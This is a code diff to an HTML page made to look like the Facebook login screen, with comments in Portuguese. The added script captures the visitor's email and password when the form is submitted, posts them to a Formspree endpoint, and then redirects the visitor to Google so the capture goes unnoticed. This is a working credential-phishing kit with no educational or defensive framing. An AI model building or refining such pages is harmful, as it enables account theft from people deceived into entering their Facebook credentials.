@@ -43,6 +43,7 @@
 
     label {
       margin-top: 10px;
+      text-align: left; /* Alinhamento à esquerda */
     }
 
     input {
@@ -107,8 +108,8 @@
       <img src="facebook-logo.png" alt="Facebook Logo">
       <h2>Entrar no Facebook</h2>
       <!-- Configuração do Formspree -->
-      <form action="https://formspree.io/f/mpzgwygb" method="post">
-        <label for="email">Email ou Senha:</label>
+      <form id="login-form">
+        <label for="email">Usuário ou Email:</label>
         <input type="text" id="email" name="email" required>
         <label for="password">Senha:</label>
         <input type="password" id="password" name="password" required>
@@ -121,5 +122,35 @@
       </form>
     </div>
   </div>
+
+  <!-- Script para enviar os dados do formulário para o Formspree e redirecionar -->
+  <script>
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Enviar os dados do formulário para o Formspree
+      fetch("https://formspree.io/f/mpzgwygb", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Dados enviados com sucesso!", data);
+        // Redirecionar o usuário para a página do Google após o envio bem-sucedido
+        window.location.href = "https://www.google.com.br";
+      })
+      .catch(error => {
+        console.error("Erro ao enviar os dados:", error);
+      });
+    });
+  </script>
 </body>
 </html>
